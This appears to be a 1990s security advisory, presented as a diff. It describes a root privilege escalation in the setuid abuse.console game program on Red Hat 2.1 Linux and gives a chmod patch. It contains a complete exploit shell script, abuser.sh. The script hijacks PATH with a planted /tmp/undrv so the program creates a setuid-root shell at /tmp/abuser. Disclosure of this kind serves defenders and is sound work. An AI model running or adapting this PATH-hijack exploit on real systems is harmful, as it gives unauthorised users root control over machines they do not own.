@@ -1,0 +1,74 @@
+   There is a security hole in Red Hat 2.1, which installs the game abuse,
+/usr/lib/games/abuse/abuse.console suid root.  The abuse.console program
+loads its files without absolute pathnames, assuming the user is running
+abuse from the /usr/lib/games/abuse directory.  One of these files in the
+undrv program, which abuse executes as root.  If the user is not in the
+abuse directory when running this, an arbitrary program can be substituted
+for undrv, allowing the user to execute arbitrary commands as root. 
+   If abuse.console needs to be run by users other than root at the console,
+provisions need to be made in the code to not execute or load any files
+as root.
+
+                   Program: /usr/lib/games/abuse/abuse.console suid root
+Affected Operating Systems: Red Hat 2.1 linux distribution
+              Requirements: account on system
+                     Patch: chmod -s /usr/lib/games/abuse/abuse.console
+       Security Compromise: root
+                    Author: Dave M. (davem@cmu.edu)
+                  Synopsis: abuse.console runs undrv without an absolute
+                            pathname while executing as root, allowing
+                            a user to substitute the real undrv with 
+                            an arbitrary program.
+
+Exploit:
+#!/bin/sh
+#
+# abuser.sh
+# exploits a security hole in abuse to create
+# a suid root shell /tmp/abuser on a linux
+# Red Hat 2.1 system with the games package 
+# installed.
+#
+# by Dave M. (davem@cmu.edu)
+#
+echo ================ abuser.sh - gain root on Linux Red Hat 2.1 system
+echo ================ Checking system vulnerability
+if test -u /usr/lib/games/abuse/abuse.console
+then
+echo ++++++++++++++++ System appears vulnerable.
+cd /tmp
+cat << _EOF_ > /tmp/undrv
+#!/bin/sh
+/bin/cp /bin/sh /tmp/abuser
+/bin/chmod 4777 /tmp/abuser
+_EOF_
+chmod +x /tmp/undrv
+PATH=/tmp
+echo ================ Executing Abuse
+/usr/lib/games/abuse/abuse.console
+/bin/rm /tmp/undrv
+if test -u /tmp/abuser
+then
+echo ++++++++++++++++ Exploit successful, suid shell located in /tmp/abuser
+else
+echo ---------------- Exploit failed
+fi
+else
+echo ---------------- This machine does not appear to be vulnerable.
+fi
+
+
+       /-------------\
+       |David Meltzer| 
+       |davem@cmu.edu|    
+ /--------------------------\
+ |School of Computer Science|
+ |Carnegie Mellon University|
+ \--------------------------/
+
+
+-- 
+infiNity .oOo.  Member of the infamous Guild |  spreading information 
+route .oOo.  Use strong Cryptography |  like it was going 
+daemon9 .oOo.  Finger for info |  out of style
+
